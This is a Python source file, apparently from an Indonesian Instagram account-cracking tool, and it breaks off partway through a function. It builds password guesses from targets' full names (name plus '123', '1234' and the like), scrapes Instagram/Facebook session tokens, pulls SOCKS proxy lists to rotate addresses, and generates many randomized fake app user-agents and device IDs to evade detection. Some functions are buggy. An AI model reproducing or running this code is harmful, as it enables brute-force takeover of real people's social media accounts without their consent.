
try:
    import re, requests, json, random, time, urllib, uuid, hashlib, os, sys, base64
    import urllib, hmac, string
    from rich.tree import Tree
    from rich import print as printf
    from rich.console import Console
    from rich.panel import Panel as Pan
    from datetime import datetime
    from bs4 import BeautifulSoup as bsp
    from rich.panel import Panel
    from rich import print as prints
    from rich.table import Table
    from rich.columns import Columns
    from concurrent.futures import ThreadPoolExecutor as executor
    from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
except (ImportError, ModuleNotFoundError) as e:
   __import__('os').system('clear') ; print(f'\n \x1b[0m[\x1b[1;91m!\x1b[0m] ModuleNotFoundError : \x1b[1;91m{str(e).title()}\n \x1b[0m[\x1b[1;91m!\x1b[0m] silahkan install module dengan ketik \x1b[0m( pip install \x1b[1;92m{str(e.name)} \x1b[0m)') ; time.sleep(3.1) ; sys.exit()

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

def kalender():
	struct_time = time.localtime(time.time())
	hari_indonesia = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
	hari = hari_indonesia[struct_time.tm_wday]
	tanggal = time.strftime("%d", struct_time)
	bulan = time.strftime("%B", struct_time)
	tahun = time.strftime("%Y", struct_time)
	jam = time.strftime("%H:%M:%S", struct_time)
	return hari, tanggal, bulan, tahun, jam

hari, tanggal, bulan, tahun, jam = kalender()
hari_save = f"{hari}-{tanggal}-{bulan}-{tahun}.txt"
session = requests.Session()

class Require:
    def __init__(self):
        self.info,self.ex = {}, {}

    def data_graph(self, xxx):
        data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
        }
        return(data)

    def headers_graph(self, xxx):
        headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
        }
        return(headers)

    def ClientId(self, xxx):
        try:
            Client = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
            return(Client)
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

    def AccountId(self, xxx):
        try:
            Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
            return(Userid)
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

    def GetRespon(self, url, cok):
        try:
            req = requests.get(url, cookies = {'cookie': cok}).text
            return(Client)
        except requests.exceptions.ConnectionError: time.sleep(5); self.GetRespon(url, cok)

    def Password(self, fullname):
        self.one,self.two = [], []
        for nama in fullname.split(' '):
            if len(nama) <2:continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:
               self.z = nama.lower()
               self.one.append(self.z+'321')
               self.one.append(self.z+'12')
               self.one.append(self.z+'123')
               self.one.append(self.z+'1234')
               self.one.append(self.z+'12345')
               self.one.append(self.z+'123456')
               self.one.append(self.z+'05')
               self.one.append(self.z+'07')
               
            else:
               self.z = nama.lower()
               self.one.append(self.z+'321')
               self.one.append(self.z+'12')
               self.one.append(self.z+'123')
               self.one.append(self.z+'1234')
               self.one.append(self.z+'12345')
               self.one.append(self.z+'123456')
               self.one.append(self.z+'05')
               self.one.append(self.z+'07')
            if len(fullname) <5:continue
            else:
               self.one.append(fullname.replace(' ','').lower())
               self.one.append(fullname.lower())
            self.l = fullname.replace('_',' ').replace('.',' ').replace('__',' ')
            if len(self.l) <3:continue
            else:
               try:
                   self.b = self.l.split(' ')
                   for self.r in self.b:
                       if len(self.r) <3:continue
                       elif len(self.r) <5:
                          self.one.append(self.r.lower() + '123')
                          self.one.append(self.r.lower() + '1234')
                          self.one.append(self.r.lower() + '12345')
                          self.one.append(self.r.lower() + '123456')
                       else:
                          self.one.append(self.r.lower() + '123')
                          self.one.append(self.r.lower() + '1234')
                          self.one.append(self.r.lower() + '12345')
                          self.one.append(self.r.lower() + '123456')
                          self.one.append(self.r.lower())
               except:pass
        for self.d in self.one:
            if self.d not in self.two:
               self.two.append(self.d)
        return self.two

    def PasswordV1(self, fullname):
        self.one, self.two = [], []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama.capitalize()+'123');self.one.append(nama.capitalize()+'1234');self.one.append(nama.capitalize()+'12345')
            else:self.one.append(nama);self.one.append(fullname);self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama.capitalize()+'123');self.one.append(nama.capitalize()+'1234');self.one.append(nama.capitalize()+'12345')
        return(self.one)

    def Signature(self, data, body='SIGNATURE'):
        return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))

    def DeviceId(self):
        return 'android-%s'%(self.uuid_(True)[:16])

    def uuid_(self, abcd=None, zd=None):
        if zd is not None:
           m = hashlib.md5()
           m.update(zd.encode('utf-8'))
           i = uuid.UUID(m.hexdigest())
        else:
           i = uuid.uuid4()
           if abcd: return str(i.hex)
        return str(i)

    def adid(self, username):
        sha2 = hashlib.sha256()
        sha2.update(username.encode('utf-8'))
        abcd = sha2.hexdigest()
        return self.uuid_(False, abcd)

    def guid(self):
        return self.uuid_(False)

    def poid(self):
        return self.uuid_(False, self.guid())

    def socks(self, item = []):
        if os.path.isfile('data/termux/internal/proxies.txt') is True:
           return(open('data/termux/internal/proxies.txt','r').read().splitlines())
        else:
           try:
               resp = requests.get('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt')
               for i in resp.text.splitlines():
                   if i.isdigit:
                      if i not in item:
                         item.append(i)
                         open('data/termux/internal/proxies.txt','a').write(f'{i}\n')
               return item
           except requests.exceptions.ConnectionError as e:
               time.sleep(5) ; self.socks()

    def vers(self):
        igv = ("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
        igve = igv.split(",")
        versi = random.choice(igve)
        return versi
        		
    def UserAgent(self):
        rr = random.randint
        rc = random.choice
        andro = rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
        dpis = rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423'])
        basa = rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        kode = rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','1839829'])
        igv = ("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133")
        igve = igv.split(",")
        versi = rc(igve)
        kntlgoreng = rc(["kenzo","markw","mido","ginkgo","hydrogen","tissot_sprout"])
        redmis = rc(["Redmi Note 4","Redmi Note 8","Redmi Note 9 Pro","MI MAX","Mi A1","Redmi Note 9S","23127PN0CC","Redmi Note 5","M2007J17C","M2101K7BNY","2201116SC","M2011K2C","Redmi Note 11R"])
        return(f'''Instagram {versi} IOS ({andro}; {dpis}; {pxl}; Iphone; {redmis}; {kntlgoreng}; qcom; {basa}; {kode})''')
     
    def UserAgenttt(self):
        rr = random.randint
        rc = random.choice    
        andro = rc(['23/6.0.1','24/7.0','22/5.1.1','26/8.0.0','17/4.2.2','19/4.4.2','25/7.1.1','21/5.0','28/9']) 
        dpis = rc(['640dpi','320dpi','480dpi','560dpi','240dpi']) 
        pxl = rc(['1440x2560','720x1280','1080x1920','1440x2792','480x800','1080x2076','1440x2768','720x1384','1080x2094']) 
        basa = rc(['pt_PT','ru_RU','fr_CA','uk_UA','de_DE','hu_HU','ru_UA','en_US']) 
        basi = rc(['qcom','samsungexynos8890']) 
        kode = rc(['98288242','99640911','99640905','99640911','102221279','117539695','98288239','144612598','143631574','127049003','126223520','94080603','96794590','90841939']) 
        igv = ("134.0.0.26.121,87.0.0.18.99,116.0.0.34.121,27.0.0.11.97,110.0.0.16.119,133.0.0.32.120,123.0.0.21.114,128.0.0.26.128,124.0.0.17.473,129.0.0.29.119,133.0.0.32.120,48.0.0.15.98,44.0.0.9.93,131.0.0.25.116,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,133.0.0.32.120,124.0.0.17.473,129.0.0.29.119,23.0.0.14.135,40.0.0.14.95,80.0") 
        igve = igv.split(",")     
        versi = rc(igve)        
        kntlgoreng = rc(["trlte"]) 
        redmis = rc(["SM-N910F"]) 
        return(f'''Instagram {versi} IOS ({andro}; {dpis}; {pxl}; iphone; {redmis}; {kntlgoreng}; {basi}; {basa}; {kode})''')

    def UaGege(self):
        dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175'])
        basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        andro = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
        xiaomi = random.choice(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G','2201117SG','M2010J19SL','M2006C3MG','2201117TY','M2003J15SC','2201117SY','23021RAAEG','M2101K7BI'])
        mod = random.choice(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn','tapas','fleur','merlinnfc','spesn','pomelo','miel'])
        com = random.choice(["qcom","mt6833","mt6765","mt8168","mt6781","mt6765","mt6768","mt6785"])
        versi = self.vers()
        return(f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; {basa})")
        
    def getUserAgentt(self):
        basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        com = random.choice(["qcom","mt6833","mt6765","mt8168","mt6781","mt6765","mt6768","mt6785"])
        versi = self.vers()
